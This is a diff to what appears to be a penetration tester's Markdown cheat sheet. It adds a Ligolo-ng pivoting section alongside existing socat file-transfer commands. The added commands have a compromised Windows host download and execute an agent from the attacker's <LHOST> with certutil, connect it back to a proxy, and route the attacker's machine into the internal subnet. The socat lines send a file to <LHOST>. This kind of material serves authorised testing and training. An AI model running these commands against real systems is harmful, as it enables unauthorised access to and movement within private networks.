@@ -92,6 +92,39 @@ socat tcp-listen:<LPORT> open:received_file,creat
 socat tcp-connect:<LHOST>:<LPORT> file:<FILE>
 ```
 
+## Ligolo-ng Pivot
+
+#Shell #Windows #Linux #Pivoting #Tunnelling
+Use Ligolo-ng when you have code execution on a pivot host and need routed access to an internal subnet.
+
+```sh
+# 1. Attacker: create and enable a Ligolo TUN interface.
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+
+# 2. Attacker: start the Ligolo proxy.
+sudo ./proxy -selfcert
+
+# 3. Target Windows: download and run the Ligolo agent.
+certutil.exe -urlcache -f http://<LHOST>/ligolo/agent.exe C:\Users\Public\agent.exe
+C:\Users\Public\agent.exe -connect <LHOST>:11601 -ignore-cert
+
+# 4. Attacker Ligolo console: select the session.
+session
+
+# 5. Option 1: use autoroute and select the discovered internal subnet.
+autoroute
+
+# 6. Option 2: start manually, inspect the internal IP, then add the route from Kali.
+start
+ifconfig
+sudo ip route add <TARGET_SUBNET> dev ligolo
+
+# 7. Cleanup if the interface already exists or routing looks stale.
+sudo ip route flush cache
+sudo ip link delete ligolo
+```
+
 ## Notes
 
-- Add Ligolo and SSH dynamic forwarding snippets here when those notes are ready.
+- Add SSH dynamic forwarding snippets here when those notes are ready.
